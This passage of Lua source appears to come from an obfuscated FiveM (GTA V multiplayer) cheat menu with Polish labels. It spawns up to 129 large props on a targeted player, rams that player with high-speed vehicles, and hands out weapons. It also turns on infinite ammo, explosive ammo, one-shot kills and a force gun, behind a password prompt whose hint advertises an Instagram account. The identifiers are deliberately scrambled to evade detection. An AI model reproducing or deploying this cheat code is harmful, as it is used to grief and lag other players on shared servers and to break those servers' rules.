					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "prop_conc_blocks01c"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Statek", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "hei_prop_heist_tug"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Zioło", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "hei_prop_heist_weed_pallet_02"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Zjazd z góry", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "p_cablecar_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Zniszczony helikopter", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "p_crahsed_heli_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Samolot 2", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
					local propdfgjhkldfg = "p_cs_mp_jet_01_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					
				end
                    elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Custom propdfgjhkldfg") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
                        local input = KeyboardInputdfjhfduhifudihdfg("Enter propdfgjhkldfg Name", "", 100)
                        if IsModelValid(input) then
                            local objfdgjhkfdg = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
                        else
                            drawNotificationuisdyfosdgfgdfjghdfjkgdfg("Invalid Model!")
                        end
                    end

                    kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("VehicleRamMenu") then
                if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Futo") then
                    local model = GetHashKey("futo")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(SelectedPlayeriufdhiguodlfgd)), true, true)	
                        SetVehicleForwardSpeed(veh, 120.0)		
                    end	
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Bus") then
                    local model = GetHashKey("bus")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(SelectedPlayeriufdhiguodlfgd)), true, true)	
                        SetVehicleForwardSpeed(veh, 120.0)		
                    end	
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Rhino") then
                    local model = GetHashKey("rhino")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(SelectedPlayeriufdhiguodlfgd)), true, true)	
                        SetVehicleForwardSpeed(veh, 120.0)		
                    end		
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Blista") then
                    local model = GetHashKey("blista")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(SelectedPlayeriufdhiguodlfgd)), true, true)	
                        SetVehicleForwardSpeed(veh, 120.0)		
                    end						
                end	
                

                    kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("SingleWepPlayer") then
                for i = 1, #allWeaponsjhsdgfsdfsdf do
                    if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf(allWeaponsjhsdgfsdfsdf[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), GetHashKey(allWeaponsjhsdgfsdfsdf[i]), 1000, false, true)
                    end
                end
                

                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("WeaponMenu") then
                if kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Pojedynczy Spawner Broni »", "SingleWeaponMenu") then
                elseif kaeogkeargmioergoeismgsdfg.ComboBoxkifdsjuhkgikdfgdfg("Damage broni/piesci", { "1x (Podstawowy)", "2x", "3x", "4x", "5x" }, currentDamagediuhgidsoufgfdfjdkihgilkdfjgdfg, selectedDamagediusygtiodfgdfkjhgdkofgfg, function(currentIndex, selectedIndex)
                    currentDamagediuhgidsoufgfdfjdkihgilkdfjgdfg = currentIndex
                    selectedDamagediusygtiodfgdfkjhgdkofgfg = selectedIndex
                end) 
                then
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Daj wszystkie bronie") then
                    for i = 1, #allWeaponsjhsdgfsdfsdf do
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeaponsjhsdgfsdfsdf[i]), 1000, false, false)
                    end
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Usun wszystkie bronie") then
                    for i = 1, #allWeaponsjhsdgfsdfsdf do
                        RemoveAllPedWeapons(PlayerPedId(), true)
                    end
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Daj ammo") then
                    for i = 1, #allWeaponsjhsdgfsdfsdf do
                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeaponsjhsdgfsdfsdf[i]), 250)
                    end
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Bez przeladowania",
                    InfClipskjdfhsdfgdg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        InfClipskjdfhsdfgdg = Enableddsyfusdsdfsdffdkjghdflgf
                        SetPedInfiniteAmmoClip(PlayerPedId(), InfClipskjdfhsdfgdg)
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Nieskonczoność ammunicji",
                    InfAmmodfjlkgldgdfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        InfAmmodfjlkgldgdfg = Enableddsyfusdsdfsdffdkjghdflgf
                        SetPedInfiniteAmmo(PlayerPedId(), InfAmmodfjlkgldgdfg)
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Wybuchowa ammunicja",
                    explosiveAmmouidsygoidfgfdfdjlohgldfgdfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        explosiveAmmouidsygoidfgfdfdjlohgldfgdfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Jednostrzalowiec", 
                    Oneshotjhausfguiydshgfuidsfdsffdljkghdlfkgjdfihfghfdlkhgjlghgfh,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        Oneshotjhausfguiydshgfuidsfdsffdljkghdlfkgjdfihfghfdlkhgjlghgfh = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Force Gun",
                    forceGunfdkgjhdflkgdfgkfjdlhgdlkfgfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        forceGunfdkgjhdflkgdfgkfjdlhgdlkfgfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Usuwanie bronia",
                    DeleteGuniuhiouhfdgfdgfdlgpijkdpfgfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        DeleteGuniuhiouhfdgfdgfdlgpijkdpfgfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                end				


                

                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("SingleWeaponMenu") then
                for i = 1, #allWeaponsjhsdgfsdfsdf do
                    if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf(allWeaponsjhsdgfsdfsdf[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeaponsjhsdgfsdfsdf[i]), 1000, false, false)
                    end
                end
            
            
        
                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif IsDisabledControlPressed(0, 40) then
                if loggedsjhgdfugdfg then
                    kaeogkeargmioergoeismgsdfg.OpenMenuPSCHOCOTOGOWNOuidshfyisdfsd("MainMenu")
                else
                    local temp = KeyboardInputdfjhfduhifudihdfg("Wpisz hasło", "", 100)
                    if temp == haslokurwa78346ygfrsfsd then
                        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~h~~g~BARDZO DOBRE HASLO!")
                        loggedsjhgdfugdfg = true
                        kaeogkeargmioergoeismgsdfg.OpenMenuPSCHOCOTOGOWNOuidshfyisdfsd("MainMenu")
                    else
                        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("HASŁO: instagram - skazateusz")
                    end
                end
            end

            Citizen.Wait(0)
        end
    end)